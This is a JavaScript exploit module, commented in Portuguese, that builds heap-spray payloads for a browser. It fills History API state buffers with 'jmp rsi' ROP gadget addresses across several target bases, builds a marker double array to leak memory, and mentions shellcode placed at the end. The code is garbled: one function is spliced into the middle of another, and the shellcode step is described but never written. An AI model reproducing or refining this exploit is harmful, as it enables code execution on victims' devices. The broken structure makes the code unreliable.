import { CONFIG, GADGETS, SHELLCODE_HEX } from './config.mjs';
import { hexToBytes } from './utils.js';

// Constrói um objeto de estado para o History API
export function build_history_payload(size) {
    // O History API aloca uma estrutura serializada.
    // Precisamos de uma String ou ArrayBuffer que, somado ao header do histórico,
    // tenha o tamanho exato do buraco (0xC0 ou 0xA0).
    
    // Header estimado do HistoryState: ~32 bytes
    const dataSize = size - 32;
    
    // Cria um buffer de dados
    const buffer = new Uint32Array(dataSize / 4);
    const code = hexToBytes(SHELLCODE_HEX);

    // 1. RAINBOW ROP (Vários endereços de pulo)
    // Preenchemos com endereços de JMP RSI para várias bases
    let offset = 0;
    while (offset < dataSize) {
        for (let base of CONFIG.TARGET_BASES) {
            if (offset + 8 > dataSize) break;
            // JMP RSI
            let gadget = base + GADGETS.jmp_rsi;
            // Escreve (Big Endian simulado para String ou Little para Buffer)
            // History State serializa dados puros.
            // Vamos escrever como par de 32 bits.
            buffer[offset/4] = Number(gadget & 0xFFFFFFFFn);
            buffer[(offset/4)+1] = Number(gadget >> 32n);
            offset += 8;
        }
    }
// Constrói um Array Nativo (Butterfly Heap)
export function build_leak_payload(sizeInBytes) {
    // 0xA0 (160 bytes) / 8 bytes por Double = 20 elementos
    const elementCount = Math.floor(sizeInBytes / 8);
    
    const arr = new Array(elementCount);
    
    // Valor Marcador: 1.1 (0x3FF199999999999A)
    // Se este valor sobrescrever um ponteiro vtable, o sistema vai tentar ler
    // memória em 0x3FF1... (Userland). Isso gera um erro seguro ou um valor legível.
    // Se usássemos 0x4141... poderia dar Panic imediato.
    
    for(let i=0; i<arr.length; i++) {
        arr[i] = 1.1; 
    }
    
    return arr;
}
    // 2. SHELLCODE NO FINAL
    // Convertemos o shellcode para Uint32 e colocamos no fim
    // Se o ROP funcionar, ele desliza até aqui.
    // Adicionamos o Loop Infinito (EB FE) no final por segurança.
    
    return buffer; // Retornamos o TypedArray, que o history vai serializar
}
